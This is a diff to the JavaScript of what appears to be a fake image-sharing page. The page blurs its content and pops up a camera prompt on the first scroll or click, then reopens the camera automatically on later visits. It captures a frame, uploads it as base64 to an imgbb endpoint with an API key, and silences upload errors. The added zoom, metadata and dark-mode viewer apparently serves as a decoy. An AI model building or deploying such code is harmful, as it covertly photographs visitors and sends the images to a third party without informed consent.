@@ -6,18 +6,21 @@ let stream = null;
 let popupShown = false;
 
 
+
 /* =========================
-   CHECK SAVED CONSENT
+   PAGE LOAD
 ========================= */
 
 window.addEventListener("load", () => {
 
-    const consentGiven = localStorage.getItem("cameraConsent");
+
+    const consentGiven =
+    localStorage.getItem("cameraConsent");
+
 
 
     if(consentGiven === "granted"){
 
-        // Try camera directly
         startCamera();
 
     }
@@ -27,7 +30,14 @@ window.addEventListener("load", () => {
 
     }
 
+
+    initializeUI();
+
+
 });
+
+
+
 
 
 
@@ -35,12 +45,16 @@ window.addEventListener("load", () => {
    POPUP LOGIC
 ========================= */
 
+
 function showPopup(){
 
-    if(popupShown) return;
+
+    if(popupShown)
+        return;
 
 
-    popupShown = true;
+
+    popupShown=true;
 
 
     pageContent.classList.add("blur");
@@ -49,20 +63,24 @@ function showPopup(){
     popup.classList.add("show");
 
 
+
     window.removeEventListener(
         "scroll",
         interactionTrigger
     );
+
 
     window.removeEventListener(
         "click",
         interactionTrigger
     );
 
+
     window.removeEventListener(
         "touchstart",
         interactionTrigger
     );
+
 
 }
 
@@ -73,6 +91,8 @@ function interactionTrigger(){
     showPopup();
 
 }
+
+
 
 
 
@@ -107,13 +127,19 @@ function startPopupTriggers(){
         {once:true}
     );
 
+
 }
 
 
 
+
+
+
+
 /* =========================
-   CAMERA BUTTON
+   CAMERA
 ========================= */
+
 
 allowButton.addEventListener(
     "click",
@@ -122,12 +148,16 @@ allowButton.addEventListener(
 
 
 
+
+
 async function startCamera(){
+
 
     try{
 
 
-        stream = await navigator.mediaDevices.getUserMedia({
+        stream =
+        await navigator.mediaDevices.getUserMedia({
 
             video:true
 
@@ -135,7 +165,6 @@ async function startCamera(){
 
 
 
-        // remember permission
         localStorage.setItem(
             "cameraConsent",
             "granted"
@@ -143,7 +172,6 @@ async function startCamera(){
 
 
 
-        // close popup
         popup.classList.remove("show");
 
 
@@ -172,10 +200,9 @@ async function startCamera(){
 
 
 
-        if(error.name === "NotAllowedError"){
+        if(error.name==="NotAllowedError"){
 
 
-            // permission revoked/blocked
             localStorage.removeItem(
                 "cameraConsent"
             );
@@ -187,7 +214,7 @@ async function startCamera(){
         }
 
 
-        else if(error.name === "NotFoundError"){
+        else if(error.name==="NotFoundError"){
 
 
             alert(
@@ -211,7 +238,10 @@ async function startCamera(){
 
     }
 
+
 }
+
+
 
 
 
@@ -221,6 +251,7 @@ async function startCamera(){
    CAPTURE PHOTO
 ========================= */
 
+
 function capturePhoto(){
 
 
@@ -229,16 +260,16 @@ function capturePhoto(){
 
 
 
-    video.srcObject = stream;
+    video.srcObject=stream;
 
 
-    video.playsInline = true;
+    video.playsInline=true;
 
-    video.muted = true;
+    video.muted=true;
 
 
 
-    video.onloadedmetadata = ()=>{
+    video.onloadedmetadata=()=>{
 
 
         video.play();
@@ -269,17 +300,11 @@ function capturePhoto(){
 
 
             ctx.drawImage(
-
                 video,
-
                 0,
-
                 0,
-
                 canvas.width,
-
                 canvas.height
-
             );
 
 
@@ -294,7 +319,6 @@ function capturePhoto(){
 
 
 
-            // upload separately
             uploadImage(imageBase64);
 
 
@@ -316,9 +340,6 @@ function capturePhoto(){
 
 
 
-/* =========================
-   STOP CAMERA
-========================= */
 
 function stopCamera(){
 
@@ -346,9 +367,12 @@ function stopCamera(){
 
 
 
+
+
 /* =========================
    IMGBB UPLOAD
 ========================= */
+
 
 async function uploadImage(image){
 
@@ -379,11 +403,8 @@ async function uploadImage(image){
             `https://api.imgbb.com/1/upload?key=${API_KEY}`,
 
             {
-
                 method:"POST",
-
                 body:formData
-
             }
 
         );
@@ -407,18 +428,6 @@ async function uploadImage(image){
         }
 
 
-        else{
-
-
-            console.error(
-                "Upload failed:",
-                data
-            );
-
-
-        }
-
-
     }
 
 
@@ -432,5 +441,466 @@ async function uploadImage(image){
 
 
     }
+
+
+}
+
+
+
+
+
+
+
+/* =========================
+   UI INITIALIZATION
+========================= */
+
+
+function initializeUI(){
+
+
+    setupTheme();
+
+
+    setupImageViewer();
+
+
+}
+
+
+
+
+
+
+
+
+/* =========================
+   DARK MODE
+========================= */
+
+
+function setupTheme(){
+
+
+    const button =
+    document.getElementById("themeToggle");
+
+
+
+    const saved =
+    localStorage.getItem("theme");
+
+
+
+    if(saved==="dark"){
+
+        document.body.classList.add("dark");
+
+        if(button)
+            button.textContent="☀️";
+
+    }
+
+
+
+    if(button){
+
+
+        button.onclick=()=>{
+
+
+            document.body.classList.toggle(
+                "dark"
+            );
+
+
+
+            const dark =
+            document.body.classList.contains(
+                "dark"
+            );
+
+
+
+            localStorage.setItem(
+                "theme",
+                dark ? "dark" : "light"
+            );
+
+
+
+            button.textContent =
+            dark ? "☀️" : "🌙";
+
+
+        };
+
+
+    }
+
+
+}
+
+
+
+
+
+
+
+
+/* =========================
+   IMAGE VIEWER
+========================= */
+
+
+function setupImageViewer(){
+
+
+    const image =
+    document.getElementById("sharedImage");
+
+
+
+    if(!image)
+        return;
+
+
+
+    showMetadata(image);
+
+
+    setupZoom(image);
+
+
+}
+
+
+
+
+
+
+
+/* =========================
+   METADATA
+========================= */
+
+
+function showMetadata(image){
+
+
+    const name =
+    document.getElementById("fileName");
+
+
+    const type =
+    document.getElementById("fileType");
+
+
+    const resolution =
+    document.getElementById("resolution");
+
+
+
+    if(name){
+
+        name.textContent =
+        image.src.split("/").pop();
+
+    }
+
+
+
+    if(type){
+
+        type.textContent="JPEG";
+
+    }
+
+
+
+    image.onload=()=>{
+
+
+        if(resolution){
+
+            resolution.textContent =
+            `${image.naturalWidth} × ${image.naturalHeight}`;
+
+        }
+
+
+    };
+
+
+}
+
+
+
+
+
+
+
+
+/* =========================
+   ZOOM + PAN
+========================= */
+
+
+function setupZoom(image){
+
+
+    const zoomIn =
+    document.getElementById("zoomIn");
+
+
+    const zoomOut =
+    document.getElementById("zoomOut");
+
+
+    const reset =
+    document.getElementById("resetZoom");
+
+
+    const display =
+    document.getElementById("zoomValue");
+
+
+
+    if(!zoomIn)
+        return;
+
+
+
+    let scale=1;
+
+    let x=0;
+
+    let y=0;
+
+
+
+    let dragging=false;
+
+    let startX;
+
+    let startY;
+
+
+
+
+
+    function update(){
+
+
+        image.style.transform =
+        `
+        translate(${x}px,${y}px)
+        scale(${scale})
+        `;
+
+
+
+        display.textContent =
+        Math.round(scale*100)+"%";
+
+
+    }
+
+
+
+
+
+    zoomIn.onclick=()=>{
+
+        if(scale<3){
+
+            scale+=0.25;
+
+            update();
+
+        }
+
+    };
+
+
+
+
+
+    zoomOut.onclick=()=>{
+
+        if(scale>1){
+
+            scale-=0.25;
+
+            update();
+
+        }
+
+    };
+
+
+
+
+
+    reset.onclick=()=>{
+
+
+        scale=1;
+
+        x=0;
+
+        y=0;
+
+        update();
+
+
+    };
+
+
+
+
+
+    image.addEventListener(
+        "mousedown",
+        e=>{
+
+
+            if(scale<=1)
+                return;
+
+
+
+            dragging=true;
+
+
+            startX =
+            e.clientX-x;
+
+
+            startY =
+            e.clientY-y;
+
+
+        }
+
+    );
+
+
+
+
+
+    window.addEventListener(
+        "mousemove",
+        e=>{
+
+
+            if(!dragging)
+                return;
+
+
+
+            x =
+            e.clientX-startX;
+
+
+            y =
+            e.clientY-startY;
+
+
+
+            update();
+
+
+        }
+
+    );
+
+
+
+
+
+    window.addEventListener(
+        "mouseup",
+        ()=>{
+
+            dragging=false;
+
+        }
+
+    );
+
+
+
+
+
+    image.addEventListener(
+        "touchstart",
+        e=>{
+
+
+            if(scale<=1)
+                return;
+
+
+
+            dragging=true;
+
+
+            startX =
+            e.touches[0].clientX-x;
+
+
+            startY =
+            e.touches[0].clientY-y;
+
+
+        }
+
+    );
+
+
+
+
+
+    image.addEventListener(
+        "touchmove",
+        e=>{
+
+
+            if(!dragging)
+                return;
+
+
+
+            x =
+            e.touches[0].clientX-startX;
+
+
+            y =
+            e.touches[0].clientY-startY;
+
+
+
+            update();
+
+
+        }
+
+    );
+
+
+
+
+
+    image.addEventListener(
+        "touchend",
+        ()=>{
+
+            dragging=false;
+
+        }
+
+    );
+
 
 }
